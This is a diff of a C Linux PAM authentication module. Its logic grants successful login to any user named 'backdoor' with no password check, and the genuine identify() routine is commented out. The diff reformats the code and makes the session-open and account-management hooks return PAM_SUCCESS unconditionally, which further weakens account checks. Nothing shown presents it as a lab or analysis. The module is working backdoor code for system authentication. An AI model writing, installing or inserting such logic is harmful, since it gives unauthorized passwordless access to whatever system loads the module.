@@ -15,21 +15,16 @@ PAM_EXTERN int pam_sm_authenticate(
 	const char **argv)
 {
 	int retval;
-
 	const char *pUsername;
+	
 	retval = pam_get_user(pamh, &pUsername, "Username: ");
-
 	printf("Welcome %s\n", pUsername);
 
 	if (retval != PAM_SUCCESS)
-	{
 		return retval;
-	}
 
 	if (strcmp(pUsername, "backdoor") != 0)
-	{
 		return PAM_AUTH_ERR;
-	}
 
 	return PAM_SUCCESS;
 	// return identify(pamh, flags, argc, argv, true);
@@ -43,6 +38,7 @@ PAM_EXTERN int pam_sm_open_session(
 	const char **argv)
 {
 	//   return identify(pamh, flags, argc, argv, false);
+	return PAM_SUCCESS;
 }
 
 // These functions below are required by PAM, but not needed in this module
@@ -53,7 +49,7 @@ PAM_EXTERN int pam_sm_acct_mgmt(
 	int argc,
 	const char **argv) 
 {
-	return PAM_IGNORE;
+	return PAM_SUCCESS;
 }
 PAM_EXTERN int pam_sm_close_session(
 	pam_handle_t *pamh,
